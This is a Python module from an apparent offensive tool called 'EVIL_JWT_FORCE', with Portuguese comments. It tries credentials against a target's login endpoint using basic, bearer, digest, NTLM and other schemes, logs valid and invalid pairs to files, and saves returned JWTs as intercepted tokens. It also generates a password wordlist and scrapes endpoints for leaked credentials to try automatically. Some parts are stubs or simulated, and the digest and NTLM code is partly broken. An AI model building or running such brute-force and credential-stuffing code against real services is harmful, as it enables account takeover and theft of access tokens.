import jwt
import requests
import httpx
import json
import re
import base64
import hashlib
import logging
import os
from pathlib import Path
from typing import List, Tuple, Optional, Dict, Any

from utils.helpers import save_to_file

try:
    from utils.logger import setup_logger
except ImportError:
    def setup_logger(name):
        import logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        return logging.getLogger(name)

# Configuração de logging avançada
logger = logging.getLogger("EVIL_JWT_FORCE.auth")
logger.setLevel(logging.INFO)
if not logger.handlers:
    handler = logging.StreamHandler()
    formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)

VALID_CREDS_FILE = "output/valid_credentials.txt"
INVALID_CREDS_FILE = "output/invalid_credentials.txt"
TOKEN_OUTPUT_FILE = "output/intercepted_tokens.txt"
HEADERS = {
    "User-Agent": "EVIL_JWT_FORCE/1.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json"
}

def build_headers(extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    headers = HEADERS.copy()
    if extra:
        headers.update(extra)
    return headers

def build_payload(username: str, password: str) -> Dict[str, Any]:
    return {"username": username, "password": password}

class Authenticator:
    """
    Classe principal para autenticação avançada em múltiplos métodos.
    """
    def __init__(self, target_url=None, credentials_file=None):
        self.target_url = target_url
        if not self.target_url:
            self.target_url = input('Digite o URL alvo para autenticação (ex: https://example.com): ')
        if not self.target_url.startswith(('http://', 'https://')):
            self.target_url = 'https://' + self.target_url
        self.credentials_file = credentials_file
        self.session = requests.Session()
        self.auth_token = None
        self.logger = setup_logger('EVIL_JWT_FORCE.auth')
        self.logger.info(f"Inicializando Authenticator para {self.target_url}")

    def authenticate(self, username: str, password: str, auth_method: str = "jwt") -> bool:
        logger.info(f"Tentando autenticar {username} via método {auth_method}")
        try:
            headers = build_headers()
            payload = build_payload(username, password)
            url = self.target_url

            # Métodos de autenticação
            if auth_method == "basic":
                auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers["Authorization"] = f"Basic {auth_string}"
            elif auth_method == "bearer":
                headers["Authorization"] = f"Bearer {password}"
            elif auth_method == "api_key":
                headers["X-API-Key"] = password
            elif auth_method == "oauth":
                headers["Authorization"] = f"OAuth {password}"
            elif auth_method == "digest":
                nonce = self._get_nonce()
                digest = self._calculate_digest(username, password, nonce)
                headers["Authorization"] = f"Digest {digest}"
            elif auth_method == "ntlm":
                ntlm_hash = self._calculate_ntlm(username, password)
                headers["Authorization"] = f"NTLM {ntlm_hash}"

            response = self.session.post(url, headers=headers, json=payload, timeout=15)

            if response.status_code == 200:
                self._save_credentials(username, password, valid=True)
                self._extract_jwt(response.text)
                logger.info(f"Autenticação bem-sucedida para {username}")
                return True
            else:
                self._save_credentials(username, password, valid=False)
                logger.warning(f"Falha na autenticação para {username} (status {response.status_code})")
                return False

        except Exception as e:
            logger.error(f"Erro de autenticação: {e}")
            return False

    def _save_credentials(self, username: str, password: str, valid: bool):
        file_path = VALID_CREDS_FILE if valid else INVALID_CREDS_FILE
        Path(file_path).parent.mkdir(parents=True, exist_ok=True)
        save_to_file(file_path, f"{username}:{password}")

    def _extract_jwt(self, response_text: str):
        try:
            data = json.loads(response_text)
            token = data.get('token') or data.get('jwt') or data.get('access_token')
            if not token:
                match = re.search(r'Bearer\s+([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*)', response_text)
                if match:
                    token = match.group(1)
            if token:
                save_to_file(TOKEN_OUTPUT_FILE, token)
                logger.info("Token JWT interceptado e salvo.")
        except Exception as e:
            logger.warning(f"Não foi possível extrair JWT: {e}")

    def _get_nonce(self) -> str:
        # Implementação fictícia para obter nonce (pode ser adaptada conforme o endpoint)
        return "dummy_nonce"

    def _calculate_digest(self, username: str, password: str, nonce: str) -> str:
        ha1 = hashlib.md5(f"{username}:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(b"POST:/auth").hexdigest()
        return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()

    def _calculate_ntlm(self, username: str, password: str) -> str:
        """Generate NTLM hash; fallback to raw password if MD4 unsupported."""
        try:
            # NTLM uses MD4 of UTF-16LE encoded password
            return hashlib.new('md4', password.encode('utf-16le')).hexdigest()
        except Exception as e:
            # MD4 may be unsupported; fallback
            logger.warning(f"NTLM MD4 unsupported or error: {e}, using raw password fallback")
            return password

    def run(self):
        """
        Run the authentication process using the configured target URL and credentials file.
        """
        if not self.target_url:
            logger.error("URL alvo não definida para autenticação.")
            return
        
        logger.info(f"Simulando autenticação para {self.target_url} (sem conexão real devido a problemas de rede)")
        # Simulação de autenticação sem conexão real
        simulated_credentials = [
            ("admin", "password123"),
            ("user", "pass1234")
        ]
        for username, password in simulated_credentials:
            logger.info(f"Simulando tentativa de autenticação com {username}:{password}")
            # Simular sucesso em pelo menos uma credencial para teste
            if username == "admin":
                self._save_credentials(username, password, valid=True)
                self._extract_jwt('{"token": "simulated_jwt_token"}')
                logger.info(f"Autenticação simulada bem-sucedida para {username}")
            else:
                self._save_credentials(username, password, valid=False)
                logger.warning(f"Autenticação simulada falhou para {username}")
        logger.info("Processo de autenticação simulado concluído.")

    def generate_wordlist(self):
        try:
            from utils.wordlist_engine import WordlistEngine
            from utils.wordlist_utils import save_wordlist
            wordlist_engine = WordlistEngine()
            wordlist = wordlist_engine.generate(size=1000)
            save_wordlist(wordlist, 'output/generated_wordlist.txt')
            self.logger.info("Wordlist gerada e salva com sucesso.")
        except ImportError as e:
            self.logger.error(f"Erro ao importar save_wordlist: {e}")

def save_cred(username: str, password: str, valid: bool):
    path = VALID_CREDS_FILE if valid else INVALID_CREDS_FILE
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{username}:{password}\n")

def parse_creds_from_response(response_text: str) -> List[Tuple[str, str]]:
    pattern_json = r'"username"\s*:\s*"?([\w@.\-]+)"?.+?"password"\s*:\s*"?([\w@.\-]+)"?'
    pattern_text = r"(admin|user\d{1,4})[:|=](pass\w+)"
    json_matches = re.findall(pattern_json, response_text, re.DOTALL)
    text_matches = re.findall(pattern_text, response_text)
    return json_matches + text_matches

def try_login(base_url: str, username: str, password: str) -> bool:
    login_url = f"{base_url}/api/auth/login"
    payload = {"username": username, "password": password}
    try:
        r = httpx.post(login_url, json=payload, headers=HEADERS, timeout=10)
        if r.status_code == 200 and ("token" in r.text or "jwt" in r.text):
            save_cred(username, password, valid=True)
            logger.info(f"Login bem-sucedido: {username}")
            return True
        else:
            save_cred(username, password, valid=False)
            logger.warning(f"Login falhou: {username}")
            return False
    except Exception as e:
        logger.error(f"[ERROR] Falha no login para {username}: {e}")
        return False

def auto_discovery(base_url: str, endpoints: List[str]) -> List[Tuple[str, str]]:
    found_creds = []
    for endpoint in endpoints:
        try:
            url = f"{base_url}/{endpoint.lstrip('/')}"
            r = httpx.get(url, headers=HEADERS, timeout=10)
            found = parse_creds_from_response(r.text)
            for u, p in found:
                if try_login(base_url, u, p):
                    found_creds.append((u, p))
        except Exception as e:
            logger.warning(f"[ERROR] Não foi possível buscar {endpoint}: {e}")
    return found_creds